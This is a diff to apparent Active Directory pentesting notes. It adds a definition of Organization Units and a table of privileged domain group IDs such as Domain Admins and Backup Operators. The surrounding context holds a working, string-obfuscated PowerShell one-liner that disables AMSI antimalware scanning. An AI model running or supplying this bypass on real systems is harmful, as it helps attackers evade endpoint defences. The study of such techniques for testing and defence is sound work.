@@ -7,7 +7,7 @@
 * Replication Service: synchronizes information about objects between all Domain Controllers
 * Forest: a security boundary that includes several domains
 * Domain: identified as a SID, contains several Organization Units
-* Organization Unit (OU):
+* Organization Unit (OU): the smallest container within a domain. Can be used to store users, groups or computers.
 
 ### Access control
 
@@ -17,6 +17,18 @@ Performed through a combination of token containing identity and privileges of u
 * DACL: discretionary ACL - access permissions of the client on the object
 * SASL: system ACL - logging and audit policies by user
 * ACE: access control entity - the single access rule that composes the list of rules used by DACL and SACL to manage accesses
+
+### User groups
+
+| ID  | Name               | Description                                                             |
+| --- | ------------------ | ----------------------------------------------------------------------- |
+| 512 | Domain Admins      | Grants administrative privilege over the whole domain                   |
+| 549 | Server Operators   | Grants administrative privilege on the DC                               |
+| 551 | Backup Operators   | Allows to access any file regardless of permission and performs backups |
+| 548 | Account Operators  | Allows to create or edit user accounts                                  |
+| 513 | Domain Users       | Includes all users                                                      |
+| 515 | Domain Computers   | Includes all machine accounts                                           |
+| 516 | Domain Controllers | Includes all DCs                                                        |
 
 ### Trust
 
@@ -39,7 +51,6 @@ Obfuscated strings to disable AMSI PowerShell protection
 
 ```
 PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
-
 ```
 
 ### Including External Scripts
